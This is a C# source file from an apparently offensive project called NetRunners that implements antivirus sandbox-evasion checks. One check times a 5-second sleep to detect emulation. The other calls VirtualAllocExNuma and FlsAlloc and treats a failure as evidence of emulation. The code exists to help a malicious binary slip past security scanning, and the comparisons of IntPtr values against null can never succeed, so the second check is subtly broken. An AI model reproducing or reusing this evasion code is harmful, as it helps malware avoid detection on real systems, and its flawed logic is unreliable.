using System;
using System.Threading;
using static NetRunners.Data.Delegates;

namespace NetRunners.Heuristics
{
	/// <summary>
	/// This class contains various functions that bypass AV detections.
	/// </summary>
    class Heuristics
    {
		// perform a sleep function, if this func is skipped the binary is being emulated by AV
		public static bool Sleep()
		{
			Console.WriteLine("[+] Sleeping 5\"");
			DateTime t1 = DateTime.Now;

			Thread.Sleep(5000);
			double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

			if (t2 < 1.5)
			{
				return false;
			}
			else
			{
				return true;
			}
        }
		// execute a non-emulable function, if memory address is null, the binary is being emulated by AV
		public static bool NonEmulated()
        {
            Console.WriteLine("[+] Running Non-Emulated APIs");
            // try to run virtualallocexnuma
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
			// try to run flsalloc
			IntPtr checkPtr = FlsAlloc(IntPtr.Zero);
			if (mem == null || checkPtr == null) 
			{ 
				return false; 
			}
			else
			{
				return true;
			}
		}
    }
}
